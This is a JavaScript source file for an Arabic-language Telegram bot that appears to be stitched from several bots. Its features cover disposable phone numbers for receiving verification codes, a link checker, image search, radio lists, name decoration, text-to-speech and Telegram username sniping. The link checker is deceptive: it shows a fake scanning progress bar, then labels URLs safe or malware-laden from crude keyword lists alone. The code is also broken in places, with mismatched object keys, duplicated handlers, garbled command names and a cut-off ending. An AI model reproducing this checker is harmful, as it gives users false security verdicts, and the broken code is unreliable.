const m =('لجميع الموقع والبرامج') 

bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;
    const data = callbackQuery.data;

    if (data === 'get_number') {
        const info = await getRandomNumberInfo();
        if (info) {
            const options = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'تغير الرقم 🔁', callback_data: 'get_number' }],
                        [{ text: 'طلب الكود 💬', callback_data: `request_code_${info.number}` }]
                    ]
                }
            };

            const response = `\n➖ تم الطلب 🛎• \n➖ رقم الهاتف ☎️ : \`${info.number}\`\n` +
                `➖ الدوله : ${info.countryName} ${info.countryFlag}\n` +
                `➖ رمز الدوله 🌏 : ${info.countryCode}\n` +
                `➖ المنصه 🔮 : ${m}\n` +
                `➖ تاريج الانشاء 📅 : ${info.creationDate}\n` +
                `➖ وقت الانشاء ⏰ : ${info.creationTime}\n` +
                `➖ اضغط ع الرقم لنسخه.`;
            bot.editMessageText(response, { chat_id: chatId, message_id: msg.message_id, parse_mode: "Markdown", reply_markup: options.reply_markup });
        } else {
            bot.sendMessage(chatId, "لم يتم استيراد الأرقام بنجاح.");
        }
    } else if (data.startsWith('request_code_')) {
        const num = data.split('_')[2];
        const messages = await getMessages(num);
        if (messages.length > 0) {
            let messageText = messages.slice(0, 6).map((msg, index) => `الرسالة رقم ${index + 1}: \`${msg}\``).join('\n\n');
            messageText += "\n\nاضغط على أي رسالة لنسخها.";
            bot.sendMessage(chatId, messageText, { parse_mode: "Markdown" });
        } else {
            bot.sendMessage(chatId, "لا توجد رسائل جديدة.");
        }
    }
});


//القايمه الخطيره
const dangerous_keywords = ["glitch", "cleanuri","gd","tinyurl","link","clck","replit","php","html","onrender","blog","index","000",];
// قائمة الامنه
const safe_urls = ["www", "t.me","store","https://youtu.be","instagram.com","facebook.com","tiktok.com","pin","snapchat.com",".com","whatsapp.com",];


let waiting_for_link = {};

function checkUrl(url) {
    const url_lower = url.toLowerCase();


    for (let safe_url of safe_urls) {
        if (url_lower.includes(safe_url)) {
            return "آمن 🟢";
        }
    }


    for (let keyword of dangerous_keywords) {
        if (url_lower.includes(keyword)) {
            return "خطير جداً 🔴";
        }
    }


    if (!url_lower.includes('.com')) {
        return "مشبوه 🟠";
    }

    return "آمن 🟢";
}

function isValidUrl(url) {

    const regex = new RegExp(/^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/i);
    return regex.test(url);
}

async function getIpInfo(ip) {

    try {
        const response = await axios.get(`https://ipinfo.io/${ip}/json`);
        return response.data;
    } catch (error) {
        return null;
    }
}

function extractIpFromUrl(url) {

    try {
        const hostname = new URL(url).hostname;
        return new Promise((resolve, reject) => {
            dns.lookup(hostname, (err, address) => {
                if (err) reject(null);
                else resolve(address);
            });
        });
    } catch (err) {
        return null;
    }
}


bot.onText(/\/sكخزننننtart/, (msg) => {
    const chatId = msg.chat.id;
    const opts = {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'فحص الروابط', callback_data: 'check_links' }]
            ]
        }
    };
    bot.sendMessage(chatId, 'اضغط على الزر لفحص الروابط', opts);
});

bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    if (callbackQuery.data === 'check_links') {
        bot.sendMessage(chatId, 'الرجاء إرسال الرابط لفحصه.');
        waiting_for_link[chatId] = true;
    }
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const url = msg.text;

    if (waiting_for_link[chatId]) {
        if (!isValidUrl(url)) {
            bot.sendMessage(chatId, 'يرجى إرسال الرابط بشكل صحيح.');
            return;
        }


        let progressMsg = await bot.sendMessage(chatId, 'Verification...\n[░░░░░░░░░░] 0%');


        await sleep(4000);
        bot.editMessageText('Verification...\n[▓▓░░░░░░░░] 25%', { chat_id: chatId, message_id: progressMsg.message_id });

        await sleep(4000);
        bot.editMessageText('Verification...\n[▓▓▓▓░░░░░░] 50%', { chat_id: chatId, message_id: progressMsg.message_id });

        await sleep(4000);
        bot.editMessageText('Verification...\n[▓▓▓▓▓▓░░░░] 75%', { chat_id: chatId, message_id: progressMsg.message_id });

        await sleep(4000);
        bot.editMessageText('Verification...\n[▓▓▓▓▓▓▓▓▓▓] 100%', { chat_id: chatId, message_id: progressMsg.message_id });

        await sleep(1000);
        bot.deleteMessage(chatId, progressMsg.message_id);

        const result = checkUrl(url);
        const ip = await extractIpFromUrl(url);
        const ipInfo = ip ? await getIpInfo(ip) : {};

        let classificationMessage = '';
        if (result === "آمن 🟢") {
            classificationMessage = "لقد قمنا بفحص الرابط وظهر أنه آمن.";
        } else if (result === "مشبوه 🟠") {
            classificationMessage = "تم تصنيفه بانه مشبوه لنه تم فحصه لمن نجد اي برمجيات خبيثه خارجيه لكتشافه ولكن لا يزال مشبوه لنه يحتوي ع الكثير من الخورزميات الذي جعلته مشبوه بنسبه لنا الرجاء الحذر مع التعامل معه وخاصه اذا طلب اي اذناوت";
        } else if (result === "خطير جداً 🔴") {
            classificationMessage = "تم اكتشاف  الكثير من البرامجيات الخبيثه الذي يمكن ان تخترقك بمرجد الدخول اليه الرجاء  عدم الدخول  لهذا  الرابط و الحذر من التعامل مع الشخص الذي رسلك هذا الرابط وشكرا.";
        }


        const resultMessage = `
        • الرابط: ${url}\n\n
        • التصنيف: ${result}\n\n
        • تفاصيل التصنيف: ${classificationMessage}\n\n
        • معلومات IP: ${ip || 'غير قابل للاستخراج'}\n\n
        • مزود الخدمة: ${ipInfo.org || 'غير متوفر'}
        `;
        bot.sendMessage(chatId, resultMessage);

        waiting_for_link[chatId] = false;
    } else {

    }
});
const currentSearch = {};


bot.onText(/\/stاههلىنححظةرلrt/, (msg) => {
    const chatId = msg.chat.id;

    const options = {
        reply_markup: {
            inline_keyboard: [[
                { text: 'بحث عن صور', callback_data: 'search_images' }
            ]]
        }
    };
    bot.sendMessage(chatId, "- بوت بحث بـ Pinterest.\n- اضغط على الزر أدناه للبحث عن صور.\n-", options);
});


bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    if (query.data === 'search_images') {

        if (currentSearch[chatId] === 'waiting_for_query') {
            bot.sendMessage(chatId, "لقد قمت بطلب بحث بالفعل. انتظر حتى يتم الانتهاء.");
        } else {
            bot.sendMessage(chatId, "أرسل لي ااي كلمة البحث عن الصور\nاقتراحات لك\n يوجد الكثير من الصور الرائعة مثل \nافتيارات شباب\nافتيارات بنات\nخلفيات\nتصاميم\nانمي\nوالمزيد من الصور ابحث عن اي صوره في راسك.... ");

            currentSearch[chatId] = 'waiting_for_query';
        }
    }
});


bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    if (currentSearch[chatId] === 'waiting_for_query') {
        const query = msg.text;
        const url = `https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=/search/my_pins/?q=${encodeURIComponent(query)}&data={"options":{"query":"${encodeURIComponent(query)}","redux_normalize_feed":true,"scope":"pins"}}`;

        try {
            const response = await axios.get(url);
            const results = response.data.resource_response?.data?.results || [];
            if (results.length === 0) {
                bot.sendMessage(chatId, "لا توجد صور بهذا البحث.");

                delete currentSearch[chatId];
                return;
            }

            for (let index = 0; index < results.length; index++) {
                const result = results[index];
                const photoUrl = result.images?.orig?.url;
                if (photoUrl) {
                    bot.sendPhoto(chatId, photoUrl, { caption: `الصوره ${index + 1}` });
                } else {
                    bot.sendMessage(chatId, "لم أتمكن من العثور على رابط الصورة.");
                }
            }

            delete currentSearch[chatId];

        } catch (e) {
            bot.sendMessage(chatId, `حدث خطأ: ${e.message}`);

            delete currentSearch[chatId];
        }
    } else if (!currentSearch[chatId]) {

    } else if (currentSearch[chatId] !== 'waiting_for_query') {

    }
});
async function fetchRadioStationsByCountry(countryCode, limit = 50) {
    const url = `https://de1.api.radio-browser.info/json/stations/bycountrycodeexact/${countryCode}?limit=${limit}`;
    try {
        const response = await axios.get(url);
        return response.data;
    } catch (error) {
        console.error('Error fetching radio stations:', error);
        return [];
    }
}


const radioCountries = {
"AE": "الإمارات 🇦🇪",
"SA": "السعودية 🇸🇦",
"YE": "اليمن 🇾🇪👑", 
"EG": "مصر 🇪🇬",
"JO": "الأردن 🇯🇴",
"QA": "قطر 🇶🇦",
"BH": "البحرين 🇧🇭",
"KW": "الكويت 🇰🇼",
"OM": "عمان 🇴🇲",
"LB": "لبنان 🇱🇧",
"SY": "سوريا 🇸🇾",
"IQ": "العراق 🇮🇶",
"MA": "المغرب 🇲🇦",
"DZ": "الجزائر 🇩🇿",
"TN": "تونس 🇹🇳",
"LY": "ليبيا 🇱🇾",
"SD": "السودان 🇸🇩",
"PS": "فلسطين 🇵🇸",
"MR": "موريتانيا 🇲🇷",
"SO": "الصومال 🇸🇴",
"DJ": "جيبوتي 🇩🇯",
"KM": "جزر القمر 🇰🇲",
"AF": "أفغانستان 🇦🇫",
"AL": "ألبانيا 🇦🇱",
"AO": "أنغولا 🇦🇴",
"AR": "الأرجنتين 🇦🇷",
"AM": "أرمينيا 🇦🇲",
  "AU": "أستراليا 🇦🇺",
  "AT": "النمسا 🇦🇹",
  "AZ": "أذربيجان 🇦🇿",
  "BD": "بنغلاديش 🇧🇩",
  "BY": "بيلاروس 🇧🇾",
  "BE": "بلجيكا 🇧🇪",
  "BZ": "بليز 🇧🇿",
  "BJ": "بنين 🇧🇯",
  "BO": "بوليفيا 🇧🇴",
  "BA": "البوسنة والهرسك 🇧🇦",
  "BW": "بوتسوانا 🇧🇼",
  "BR": "البرازيل 🇧🇷",
  "BG": "بلغاريا 🇧🇬",
  "BF": "بوركينا فاسو 🇧ﺫ",
  "KH": "كمبوديا 🇰🇭",
  "CM": "الكاميرون 🇨🇲",
  "CA": "كندا 🇨🇦",
  "CL": "تشيلي 🇨🇱",
  "CN": "الصين 🇨🇳",
  "CO": "كولومبيا 🇨🇴",
  "CR": "كوستاريكا 🇨🇷",
  "HR": "كرواتيا 🇭🇷",
  "CY": "قبرص 🇨🇾",
  "CZ": "التشيك 🇨🇿",
  "DK": "الدنمارك 🇩🇰",
  "EC": "الإكوادور 🇪🇨",
  "EG": "مصر 🇪🇬",
  "SV": "السلفادور 🇸🇻",
  "EE": "إستونيا 🇪🇪",
  "ET": "إثيوبيا 🇪🇹",
  "FI": "فنلندا 🇫🇮",
  "FR": "فرنسا 🇫🇷",
  "GE": "جورجيا 🇬🇪",
  "DE": "ألمانيا 🇩🇪",
  "GH": "غانا 🇬🇭",
  "GR": "اليونان 🇬🇷",
  "GT": "غواتيمالا 🇬🇹",
  "HN": "هندوراس 🇭🇳",
  "HK": "هونغ كونغ 🇭🇰",
  "HU": "المجر 🇭🇺",
  "IS": "آيسلندا 🇮🇸",
  "IN": "الهند 🇮🇳",
  "ID": "إندونيسيا 🇮🇩",
  "IR": "إيران 🇮🇷",
  "IE": "أيرلندا 🇮🇪",
  "IL": " المحتله 🇮🇱",
  "IT": "إيطاليا 🇮🇹",
  "CI": "ساحل العاج 🇨🇮",
  "JP": "اليابان 🇯🇵",
  "KZ": "كازاخستان 🇰🇿",
  "KE": "كينيا 🇰🇪",
  "KG": "قيرغيزستان 🇰🇬",
  "LV": "لاتفيا 🇱🇻",
  "LT": "ليتوانيا 🇱🇹",
  "LU": "لوكسمبورغ 🇱🇺",
  "MO": "ماكاو 🇲🇴",
  "MY": "ماليزيا 🇲🇾",
  "ML": "مالي 🇲🇱",
  "MT": "مالطا 🇲🇹",
  "MX": "المكسيك 🇲🇽",
  "MC": "موناكو 🇲🇨",
  "MN": "منغوليا 🇲🇳",
  "ME": "الجبل الأسود 🇲🇪",
  "MA": "المغرب 🇲🇦",
  "MZ": "موزمبيق 🇲🇿",
  "MM": "ميانمار 🇲🇲",
  "NA": "ناميبيا 🇳🇦",
  "NP": "نيبال 🇳🇵",
  "NL": "هولندا 🇳🇱",
  "NZ": "نيوزيلندا 🇳🇿",
  "NG": "نيجيريا 🇳🇬",
  "KP": "كوريا الشمالية 🇰🇵",
  "NO": "النرويج 🇳🇴",
  "PK": "باكستان 🇵🇰",
  "PS": "فلسطين 🇵🇸",
  "PA": "بنما 🇵🇦",
  "PY": "باراغواي 🇵🇾",
  "PE": "بيرو 🇵🇪",
  "PH": "الفلبين 🇵🇭",
  "PL": "بولندا 🇵🇱",
  "PT": "البرتغال 🇵🇹",
  "PR": "بورتوريكو 🇵🇷",
  "RO": "رومانيا 🇷🇴",
  "RU": "روسيا 🇷🇺",
  "RW": "رواندا 🇷🇼",
  "SN": "السنغال 🇸🇳",
  "RS": "صربيا 🇷🇸",
  "SG": "سنغافورة 🇸🇬",
  "SK": "سلوفاكيا 🇸🇰",
  "SI": "سلوفينيا 🇸🇮",
  "ZA": "جنوب أفريقيا 🇿🇦",
  "KR": "كوريا الجنوبية 🇰🇷",
  "ES": "إسبانيا 🇪🇸",
  "LK": "سريلانكا 🇱🇰",
  "SD": "السودان 🇸🇩",
  "SE": "السويد 🇸🇪",
  "CH": "سويسرا 🇨🇭",
  "SY": "سوريا 🇸🇾",
  "TW": "تايوان 🇹🇼",
  "TZ": "تنزانيا 🇹🇿",
  "TH": "تايلاند 🇹🇭",
  "TG": "توغو 🇹🇬",
  "TN": "تونس 🇹🇳",
  "TR": "تركيا 🇹🇷",
  "TM": "تركمانستان 🇹🇲",
  "UG": "أوغندا 🇺🇬",
  "UA": "أوكرانيا 🇺🇦",
  "AE": "الإمارات 🇦🇪",
  "GB": "بريطانيا 🇬🇧",
  "US": "امريكا 🇺🇸",
  "UY": "أوروغواي 🇺🇾",
  "UZ": "أوزبكستان 🇺🇿",
  "VE": "فنزويلا 🇻🇪",
  "VN": "فيتنام 🇻🇳",
  "ZM": "زامبيا 🇿🇲",
  "ZW": "زيمبابوي 🇿🇼",
  "GL": "غرينلاند 🇬🇱",
  "KY": "جزر كايمان 🇰🇾",
  "NI": "نيكاراغوا 🇳🇮",
  "DO": "الدومينيكان 🇩🇴",
  "NC": "كاليدونيا 🇳🇨",
  "LA": "لاوس 🇱🇦",
  "TT": "ترينيداد وتوباغو 🇹🇹",
  "GG": "غيرنزي 🇬🇬",
  "GU": "غوام 🇬🇺",
  "GP": "غوادلوب 🇬🇵",
  "MG": "مدغشقر 🇲🇬",
  "RE": "ريونيون 🇷🇪",
  "FO": "جزر فارو 🇫🇴",
  "MD": "مولدوفا 🇲🇩"  
};


function splitRadioCountries(lst, size) {
    let result = [];
    for (let i = 0; i < lst.length; i += size) {
        result.push(lst.slice(i, i + size));
    }
    return result;
}


bot.onText(/\/staㅎrtradㅎㅗio/, (msg) => {
    const chatId = msg.chat.id;
    const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'الحصول على محطات الراديو', callback_data: 'get_radio_countries_0' }]
            ]
        }
    };
    bot.sendMessage(chatId, "مرحباً! اضغط على الزر أدناه لاختيار دولة والحصول على محطات الراديو.", options);
});


bot.on('callback_query', async (callbackQuery) => {
    const { data, message } = callbackQuery;

    if (data.startsWith('get_radio_countries')) {
        const page = parseInt(data.split('_')[3], 10);
        const countriesList = Object.entries(radioCountries);
        const pages = splitRadioCountries(countriesList, 70);  

        const inlineKeyboard = [];


        if (pages[page]) {
            pages[page].forEach(([code, name], index) => {
                if (index % 3 === 0) inlineKeyboard.push([]);
                inlineKeyboard[inlineKeyboard.length - 1].push({ text: name, callback_data: `radio_${code}` });
            });


            if (page < pages.length - 1) {
                inlineKeyboard.push([{ text: 'المزيد', callback_data: `get_radio_countries_${page + 1}` }]);
            }
        }

        const options = {
            reply_markup: { inline_keyboard: inlineKeyboard }
        };


        if (inlineKeyboard.length === 0) {
            await bot.sendMessage(message.chat.id, "لا توجد دول متاحة.");
        } else {
            await bot.editMessageText('اختر دولة من القائمة:', {
                chat_id: message.chat.id,
                message_id: message.message_id,
                reply_markup: options.reply_markup 
            });
        }
    }

    if (data.startsWith('radio_')) {
        const countryCode = data.split('_')[1];
        const countryName = radioCountries[countryCode];

        let progressMsg = await bot.sendMessage(message.chat.id, 'Loading Radio...\n[░░░░░░░░░░] 0%');

        const progressStages = [
            '[▓▓░░░░░░░░] 25%',
            '[▓▓▓▓░░░░░░] 50%',
            '[▓▓▓▓▓▓░░░░] 75%',
            '[▓▓▓▓▓▓▓▓▓▓] 100%'
        ];

        for (let i = 0; i < progressStages.length; i++) {
            await new Promise(resolve => setTimeout(resolve, 2000));
            await bot.editMessageText(`Loading Radio...\n${progressStages[i]}`, {
                chat_id: message.chat.id,
                message_id: progressMsg.message_id
            });
        }

        await new Promise(resolve => setTimeout(resolve, 1000));
        await bot.deleteMessage(message.chat.id, progressMsg.message_id);

        const stations = await fetchRadioStationsByCountry(countryCode);

        let responseMessage = stations.length
            ? `محطات الراديو المتاحة في ${countryName}:\n`
            : `لا توجد محطات متاحة في ${countryName}.`;

        stations.slice(0, 40).forEach(station => {
            responseMessage += `اسم المحطة: ${station.name}\nرابط البث: ${station.url}\n\n`;
        });

        bot.sendMessage(message.chat.id, responseMessage);
    }
});
const userStates = {};
async function زخرفة_الاسم(name) {
    const url = 'https://coolnames.online/cool.php';
    const headers = {
        'authority': 'coolnames.online',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
    };
    const data = new URLSearchParams();
    data.append('name', name);
    data.append('get', '');

    try {
        const response = await axios.post(url, data, { headers });
        if (response.status === 200) {
            const $ = cheerio.load(response.data);
            const textareas = $('textarea.form-control.ltr.green');
            const results = [];
            textareas.each((i, el) => {
                results.push($(el).text());
            });
            return results;
        } else {
            return null;
        }
    } catch (error) {
        console.error(error);
        return null;
    }
}


bot.onText(/\/stظصakعصمrt/, (msg) => {
    const chatId = msg.chat.id;
    const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'زخرفة الاسماء', callback_data: 'zakhrafa' }]
            ]
        }
    };
    bot.sendMessage(chatId, 'أهلاً بك! اضغط على الزر لتزخرف اسمك.', options);
});


bot.on('callback_query', (callbackQuery) => {
    const message = callbackQuery.message;
    const userId = message.chat.id;

    if (callbackQuery.data === 'zakhrafa') {

        userStates[userId] = { awaitingName: true };
        bot.sendMessage(userId, 'أرسل الاسم الذي تريد زخرفته.');
    }
});


bot.on('message', async (msg) => {
    const userId = msg.chat.id;


    if (userStates[userId] && userStates[userId].awaitingName) {
        const name = msg.text;
        const results = await زخرفة_الاسم(name);

        if (results) {
            results.forEach((result) => {
                bot.sendMessage(userId, result);
            });
        } else {
            bot.sendMessage(userId, 'حدث خطأ أثناء الزخرفة، حاول مرة أخرى.');
        }


        userStates[userId].awaitingName = false;
    }
});
const userSessions = {};


async function textToSpeech(text, gender) {
    const url = 'https://texttospeech.responsivevoice.org/v1/text:synthesize';
    const params = {
        text: text,
        lang: 'ar',  
        engine: 'g3',
        pitch: '0.5',
        rate: '0.5',
        volume: '1',
        key: 'kvfbSITh',
        gender: gender === 'male' ? 'male' : 'female'  
    };

    const headers = {
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'referer': 'https://responsivevoice.org/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    };

    try {
        const response = await axios.get(url, { params, headers, responseType: 'arraybuffer' });
        return Readable.from(response.data);
    } catch (error) {
        console.error("Error occurred, retrying with English text...");
        return await retryWithEnglish(gender);
    }
}


async function retryWithEnglish(gender) {
    const englishText = "Please convert this text to speech";  
    const url = 'https://texttospeech.responsivevoice.org/v1/text:synthesize';
    const params = {
        text: englishText,
        lang: 'en',
        engine: 'g3',
        pitch: '0.5',
        rate: '0.5',
        volume: '1',
        key: 'kvfbSITh',
        gender: gender === 'male' ? 'male' : 'female'
    };

    const headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://responsivevoice.org/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    };

    try {
        const response = await axios.get(url, { params, headers, responseType: 'arraybuffer' });
        return Readable.from(response.data);
    } catch (error) {
        return null;
    }
}


bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;

    if (callbackQuery.data === 'convert_text') {

        userSessions[chatId] = { gender: null, text: null };

        const options = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'صوت ذكر', callback_data: 'male_voice' }],
                    [{ text: 'صوت أنثى', callback_data: 'female_voice' }]
                ]
            }
        };
        bot.sendMessage(chatId, 'اختر نوع الصوت:', options);
    } else if (callbackQuery.data === 'male_voice' || callbackQuery.data === 'female_voice') {
        const gender = callbackQuery.data === 'male_voice' ? 'male' : 'female';


        userSessions[chatId].gender = gender;


        bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: callbackQuery.message.message_id });

        bot.sendMessage(chatId, `الآن أرسل النص الذي تريد تحويله إلى صوت بصوت ${gender === 'male' ? 'ذكر' : 'أنثى'}.`);
    }
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;


    if (userSessions[chatId] && userSessions[chatId].gender) {
        const text = msg.text;


        userSessions[chatId].text = text;

        const gender = userSessions[chatId].gender;
        const audioFile = await textToSpeech(text, gender);

        if (audioFile) {
            bot.sendVoice(chatId, audioFile);
        } else {
            bot.sendMessage(chatId, 'عذرًا، لم أستطع تحويل النص إلى صوت.');
        }


        delete userSessions[chatId];
    }
});
let md = 0;  
let validUsers = 0;  
let checkedUsers = 0;  
let userList = [];  
const abc1 = 'YYYTTTTIIIIIRRRAAJAXXXXFFFLlHHHJJJJJSSSSlllllllllllllTTTYYYIIIXXXXJXXXXXJXYFFVVVKKKKEEEE';


async function startSearch(chatId, messageId, userType) {
  userList = [];

  for (let i = 0; i < 10; i++) {
    let user = '';
    if (userType === "triple") {
      let v1 = abc1[Math.floor(Math.random() * abc1.length)];
      let v2 = abc1[Math.floor(Math.random() * abc1.length)];
      let v3 = abc1[Math.floor(Math.random() * abc1.length)];
      let v4 = abc1[Math.floor(Math.random() * abc1.length)];
      user = `${v2}_${v1}${v3}`;
    } else if (userType === "quad") {
      user = Array.from({ length: 4 }, () => abc1[Math.floor(Math.random() * abc1.length)]).join('');
    } else if (userType === "semi_quad") {
      user = Array.from({ length: 3 }, () => abc1[Math.floor(Math.random() * abc1.length)]).join('') + '_' + abc1[Math.floor(Math.random() * abc1.length)];
    } else if (userType === "semi_triple") {
      user = Array.from({ length: 2 }, () => abc1[Math.floor(Math.random() * abc1.length)]).join('') + '_' + abc1[Math.floor(Math.random() * abc1.length)];
    } else if (userType === "random") {
      let length = Math.floor(Math.random() * (4 - 3 + 1)) + 3;
      user = Array.from({ length }, () => abc1[Math.floor(Math.random() * abc1.length)]).join('');
    } else {
      user = Array.from({ length: 4 }, () => abc1[Math.floor(Math.random() * abc1.length)]).join('');
    }

    try {
      const url = await axios.get(`https://t.me/${user}`);
      checkedUsers++;
      updateButtons(chatId, messageId, user);

      if (url.data.includes('tgme_username_link')) {
        validUsers++;
        bot.sendMessage(chatId, `تم الصيد بوزر جديد ✅ : @${user}`);
        userList.push(user);
      } else {

      }

      md++;
    } catch (error) {
      console.error(error);
    }

    await new Promise(resolve => setTimeout(resolve, 1000));
  }

  showFinalStatistics(chatId);
}


function updateButtons(chatId, messageId, currentUser) {
  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: `🔍 يتم فحص: ${currentUser}`, callback_data: 'checking' }],
        [{ text: `عدد اليوزرات المفحوصة: ${checkedUsers}`, callback_data: 'checked' }],
        [{ text: `عدد اليوزرات المحجوزة: ${validUsers}`, callback_data: 'valid' }]
      ]
    }
  };

  bot.editMessageReplyMarkup(options.reply_markup, { chat_id: chatId, message_id: messageId });
}


function showFinalStatistics(chatId) {
  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: `عدد اليوزرات المفحوصة: ${checkedUsers}`, callback_data: 'checked' }],
        [{ text: `عدد اليوزرات المحجوزة: ${validUsers}`, callback_data: 'valid' }],
        [{ text: `📊 إحصائيات نهائية: ${md} محاولة، ${validUsers} يوزرات محجوزة`, callback_data: 'final_stats' }]
      ]
    }
  };

  bot.sendMessage(chatId, "تم الانتهاء من البحث. هذه هي الإحصائيات النهائية:", options);
}


bot.onText(/\/stㄹㅎㅊart/, (msg) => {
  const chatId = msg.chat.id;
  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: '🚀 صيد يوزرات', callback_data: 'choose_type' }]
      ]
    }
  };
  bot.sendMessage(chatId, "أهلاً بك! اضغط على الزر لبدء صيد اليوزرات.", options);
});


bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;

  if (query.data === 'choose_type') {
    const options = {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'يوزرات نوع1', callback_data: 'triple' }],
          [{ text: 'يوزرات رباعية', callback_data: 'quad' }],
          [{ text: 'شبه رباعية', callback_data: 'semi_quad' }],
          [{ text: 'شبه ثلاثية', callback_data: 'semi_triple' }],
          [{ text: 'عشوائية', callback_data: 'random' }],
          [{ text: 'مميز', callback_data: 'extra' }]
        ]
      }
    };

    bot.editMessageText('اختر نوع اليوزرات:', {
      chat_id: chatId,
      message_id: messageId,
      reply_markup: options.reply_markup
    });
  } else if (['triple', 'quad', 'semi_quad', 'semi_triple', 'random', 'extra'].includes(query.data)) {

    startSearch(chatId, messageId, query.data);
  }
});



const chatSessions = {}; 


const الدول = {
    "+1": ["أمريكا", "🇺🇸"],
    "+46": ["السويد", "🇸🇪"],
    "+86": ["الصين", "🇨🇳"],
    "+852": ["هونغ كونغ", "🇭🇰"],
    "+45": ["الدنمارك", "🇩🇰"],
    "+33": ["فرنسا", "🇫🇷"],
    "+31": ["هولندا", "🇳🇱"],
    "+7": ["روسيا", "🇷🇺"],
    "+7KZ": ["كازاخستان", "🇰🇿"],
    "+381": ["صربيا", "🇷🇸"],
    "+44": ["بريطانيا", "🇬🇧"],
    "+371": ["لاتفيا", "🇱🇻"],
    "+62": ["إندونيسيا", "🇮🇩"],
    "+351": ["البرتغال", "🇵🇹"],
    "+34": ["إسبانيا", "🇪🇸"],
    "+372": ["إستونيا", "🇪🇪"],
    "+358": ["فنلندا", "🇫🇮"], 
    "+61": ["أستراليا ", "🇦🇺"], 
    "+55": ["البرازيل ", "🇧🇷"], 
    "+229": ["بنين", "🇧🇯"], 
    "+43": ["النمسا", "🇦🇹"], 
    "+54": ["الأرجنتين ", "🇦🇷"], 
    "+961": ["لبنان", "🇱🇧"],
    "+49": ["المانيا ", "🇩🇪"], 
    "+994": ["أذربيجان ", "🇦🇿"], 
    "+351": ["البرتغال ", "🇵🇹"], 
    "+60": ["ماليزيا ", "🇲🇾"], 
    "+63": ["الفلبين ", "🇵🇭"]
};

async function استيراد_الأرقام() {
    try {
        const response = await fetch('https://nmp-indol.vercel.app/');
        const text = await response.text();
        return text.split('\n');
    } catch (error) {
        console.error(`خطأ في جلب الأرقام: ${error}`);
        return [];
    }
}


async function الحصول_على_معلومات_رقم_عشوائي() {
    const الأرقام = await استيراد_الأرقام();
    if (الأرقام.length === 0) return null;

    const الرقم = الأرقام[randomInt(الأرقام.length)].trim();
    const تاريخ_الإنشاء = new Date().toISOString().split('T')[0];
    const وقت_الإنشاء = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', hour12: true });

    let رمز_الدولة = Object.keys(الدول).find(code => الرقم.startsWith(code)) || الرقم.slice(0, 4);
    const معلومات_الدولة = الدول[رمز_الدولة] || ["دولة غير معروفة", "🚩"];

    return {
        "رقم": الرقم,
        "رمز_الدولة": رمز_الدولة,
        "اسم_الدولة": معلومات_الدولة[0],
        "علم_الدولة": معلومات_الدولة[1],
        "تاريخ_الإنشاء": تاريخ_الإنشاء,
        "وقت_الإنشاء": وقت_الإنشاء
    };
}


async function استخراج_الرسائل_من_الموقع(رقم) {
    const url = `https://receive-smss.live/messages?n=${رقم}`;

    const headers = {
        'authority': 'receive-smss.live',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
    };

    const response = await fetch(url, { headers });

    if (response.ok) {
        const html = await response.text();
        const $ = cheerio.load(html);
        const الرسائل = [];
        $('.row.message_details.mb-3').each((_, msg) => {
            const sender = $(msg).find('.sender').text().trim();
            const messageContent = $(msg).find('.msg span').text().trim();
            الرسائل.push([sender, messageContent]);
        });
        return الرسائل.slice(0, 5);
    } else {
        return null;
    }
}


bot.onText(/\/starㅇ함ㅏㅏㅗht/, async (message) => {
    const chatId = message.chat.id;
    bot.sendMessage(chatId, "اضغط على الزر للحصول على رقم وهمي:", {
        reply_markup: {
            inline_keyboard: [[{ text: 'الحصول على رقم وهمي', callback_data: 'الحصول_على_رقم' }]]
        }
    });
});


bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;

    if (callbackQuery.data === 'الحصول_على_رقم') {
        const معلومات = await الحصول_على_معلومات_رقم_عشوائي();
        await ارسال_معلومات_الرقم(callbackQuery.message, معلومات);
    } else if (callbackQuery.data.startsWith('طلب_الكود_')) {
        const رقم = callbackQuery.data.split('_')[2];
        const الرسائل = await استخراج_الرسائل_من_الموقع(رقم);
